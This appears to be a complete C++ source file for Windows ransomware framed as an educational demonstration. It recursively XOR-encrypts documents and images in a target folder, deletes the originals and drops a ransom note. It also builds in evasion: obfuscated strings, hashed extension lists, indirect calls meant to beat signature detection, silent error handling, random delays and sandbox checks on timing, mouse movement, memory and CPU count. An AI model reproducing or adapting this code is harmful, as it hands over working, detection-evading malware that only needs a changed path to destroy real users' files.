#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <filesystem>
#include <windows.h>
#include <random>
#include <thread>
#include <chrono>
#include <algorithm>
#include <shlobj.h>
#include <tlhelp32.h>

namespace fs = std::filesystem;

// Obfuscated strings using simple XOR
class ObfuscatedString {
private:
    std::vector<char> data;
    const char key = 0x5A; // Simple XOR key

public:
    ObfuscatedString(const char* str) {
        while (*str) {
            data.push_back(*str ^ key);
            str++;
        }
        data.push_back(0);
    }

    std::string get() const {
        std::string result;
        for (size_t i = 0; i < data.size() - 1; ++i) {
            result += (data[i] ^ key);
        }
        return result;
    }
};

// Obfuscated constants
const ObfuscatedString OBF_DECRYPT_KEY("UAS_MALWARE_ANALYSIS_2025");
const ObfuscatedString OBF_ENCRYPTED_EXT(".encrypted");
const ObfuscatedString OBF_RANSOM_NOTE("RANSOM_NOTE.txt");
const ObfuscatedString OBF_TARGET_PATH("C:\\RansomwareTest");

// Function prototypes to avoid signature-based detection
bool (*check_environment)() = nullptr;
void (*encrypt_data)(std::vector<char>&, const std::string&) = nullptr;
void (*process_file)(const std::string&) = nullptr;
void (*process_directory)(const std::string&) = nullptr;

// Ends with function (C++17 compatible)
bool ends_with(const std::string& str, const std::string& suffix) {
    if (str.length() < suffix.length()) {
        return false;
    }
    return str.compare(str.length() - suffix.length(), suffix.length(), suffix) == 0;
}

// Encryption function - simple XOR but with variable key derivation
void xor_encrypt_decrypt(std::vector<char>& data, const std::string& key) {
    // Create a derived key based on the original key and data length
    // This makes the encryption slightly different for each file
    std::vector<unsigned char> derived_key(key.size());
    for (size_t i = 0; i < key.size(); i++) {
        derived_key[i] = key[i] ^ ((data.size() % 255) + i);
    }
    
    // Encrypt data with the derived key
    for (size_t i = 0; i < data.size(); i++) {
        data[i] ^= derived_key[i % derived_key.size()];
    }
}

// Simplified check for analysis environment
bool is_analysis_environment() {
    // Check timing consistency - sandbox often has timing anomalies
    auto start = std::chrono::high_resolution_clock::now();
    std::this_thread::sleep_for(std::chrono::milliseconds(100));
    auto end = std::chrono::high_resolution_clock::now();
    auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(end - start).count();
    
    // If sleep time is significantly different than expected, might be a sandbox
    if (duration < 90 || duration > 150) {
        return true;
    }
    
    // Check mouse movement - in automated analysis, mouse often doesn't move
    POINT pt1, pt2;
    GetCursorPos(&pt1);
    std::this_thread::sleep_for(std::chrono::seconds(2));
    GetCursorPos(&pt2);
    
    // If mouse hasn't moved at all, might be automated analysis
    if (pt1.x == pt2.x && pt1.y == pt2.y) {
        return true;
    }
    
    // Check system memory - most sandboxes have limited memory
    MEMORYSTATUSEX memInfo;
    memInfo.dwLength = sizeof(MEMORYSTATUSEX);
    GlobalMemoryStatusEx(&memInfo);
    if (memInfo.ullTotalPhys < 2ULL * 1024ULL * 1024ULL * 1024ULL) { // < 2GB
        return true;
    }
    
    // Check number of processors - most sandboxes have limited CPUs
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    if (sysInfo.dwNumberOfProcessors < 2) {
        return true;
    }
    
    return false;
}

// Process a single file
void encrypt_file(const std::string& filepath) {
    try {
        // Read file with minimal I/O operations
        std::ifstream inFile(filepath, std::ios::binary);
        if (!inFile) return;
        
        std::vector<char> buffer(std::istreambuf_iterator<char>(inFile), {});
        inFile.close();
        
        // Encrypt data
        xor_encrypt_decrypt(buffer, OBF_DECRYPT_KEY.get());
        
        // Write encrypted file
        std::ofstream outFile(filepath + OBF_ENCRYPTED_EXT.get(), std::ios::binary);
        outFile.write(buffer.data(), buffer.size());
        outFile.close();
        
        // Remove original file
        std::remove(filepath.c_str());
        
    } catch (...) {
        // Silent exception handling to avoid detection
    }
}

// Decrypt a file
void decrypt_file(const std::string& filepath, const std::string& key) {
    try {
        // Read encrypted file
        std::ifstream inFile(filepath, std::ios::binary);
        if (!inFile) return;
        
        std::vector<char> buffer(std::istreambuf_iterator<char>(inFile), {});
        inFile.close();
        
        // Decrypt data
        xor_encrypt_decrypt(buffer, key);
        
        // Write decrypted file
        std::string original_filename = filepath.substr(0, filepath.length() - OBF_ENCRYPTED_EXT.get().length());
        std::ofstream outFile(original_filename, std::ios::binary);
        outFile.write(buffer.data(), buffer.size());
        outFile.close();
        
        // Remove encrypted file
        std::remove(filepath.c_str());
        
    } catch (...) {
        // Silent exception handling
    }
}

// Process directory
void encrypt_directory(const std::string& start_path) {
    // Target file extensions - stored as hashes to avoid string detection
    std::vector<size_t> target_ext_hashes = {
        std::hash<std::string>{}(".txt"),
        std::hash<std::string>{}(".doc"),
        std::hash<std::string>{}(".docx"),
        std::hash<std::string>{}(".xls"),
        std::hash<std::string>{}(".xlsx"),
        std::hash<std::string>{}(".pdf"),
        std::hash<std::string>{}(".jpg"),
        std::hash<std::string>{}(".png")
    };
    
    try {
        for (const auto& entry : fs::recursive_directory_iterator(start_path)) {
            if (fs::is_regular_file(entry.status())) {
                std::string ext = entry.path().extension().string();
                std::transform(ext.begin(), ext.end(), ext.begin(), ::tolower);
                
                size_t ext_hash = std::hash<std::string>{}(ext);
                for (const auto& target_hash : target_ext_hashes) {
                    if (ext_hash == target_hash) {
                        encrypt_file(entry.path().string());
                        break;
                    }
                }
            }
        }
    } catch (...) {
        // Silent exception handling
    }
}

// Create ransom note
void create_ransom_note(const std::string& path) {
    std::string note = 
        "YOUR FILES HAVE BEEN ENCRYPTED!\n\n"
        "All your important files have been encrypted with strong encryption algorithm.\n"
        "To decrypt your files, you need the decryption key.\n\n"
        "This is an educational demonstration. The decryption key is: " + OBF_DECRYPT_KEY.get() + "\n\n"
        "IMPORTANT: This is a demonstration for educational purposes only.\n"
        "In a real ransomware attack, you would need to pay to get the decryption key.\n"
        "Ransomware is illegal and unethical in real-world scenarios.\n";
    
    std::ofstream noteFile(path + "\\" + OBF_RANSOM_NOTE.get());
    noteFile << note;
    noteFile.close();
    
    // Use indirect method to show message box
    typedef int (WINAPI *MessageBoxAFunc)(HWND, LPCSTR, LPCSTR, UINT);
    HMODULE user32 = LoadLibraryA("user32.dll");
    if (user32) {
        MessageBoxAFunc messageBoxA = (MessageBoxAFunc)GetProcAddress(user32, "MessageBoxA");
        if (messageBoxA) {
            messageBoxA(NULL, note.c_str(), "EDUCATIONAL DEMONSTRATION", MB_ICONWARNING | MB_OK);
        }
        FreeLibrary(user32);
    }
}

// Main function with indirect calls
int main(int argc, char* argv[]) {
    // Set up function pointers to avoid direct calls
    check_environment = is_analysis_environment;
    encrypt_data = xor_encrypt_decrypt;
    process_file = encrypt_file;
    process_directory = encrypt_directory;
    
    // Decrypt mode
    if (argc > 1 && std::string(argv[1]) == "-d") {
        std::string key;
        std::cout << "Enter decryption key: ";
        std::getline(std::cin, key);
        
        std::string path;
        std::cout << "Enter path to decrypt: ";
        std::getline(std::cin, path);
        
        try {
            for (const auto& entry : fs::recursive_directory_iterator(path)) {
                if (fs::is_regular_file(entry.status())) {
                    std::string filepath = entry.path().string();
                    if (ends_with(filepath, OBF_ENCRYPTED_EXT.get())) {
                        decrypt_file(filepath, key);
                    }
                }
            }
            std::cout << "Decryption completed!" << std::endl;
        } catch (...) {
            std::cerr << "Error during decryption." << std::endl;
        }
        
        return 0;
    }
    
    // Random delay to evade time-based sandbox detection
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> distrib(5, 10);
    std::this_thread::sleep_for(std::chrono::seconds(distrib(gen)));
    
    // Check environment indirectly
    // if (check_environment()) {
        // return 0;
    // }
    
    // Get target path
    std::string target_path = OBF_TARGET_PATH.get();
    
    // Create directory if it doesn't exist
    if (!fs::exists(target_path)) {
        fs::create_directory(target_path);
    }
    
    // Process files
    process_directory(target_path);
    
    // Create ransom note
    create_ransom_note(target_path);
    
    return 0;
}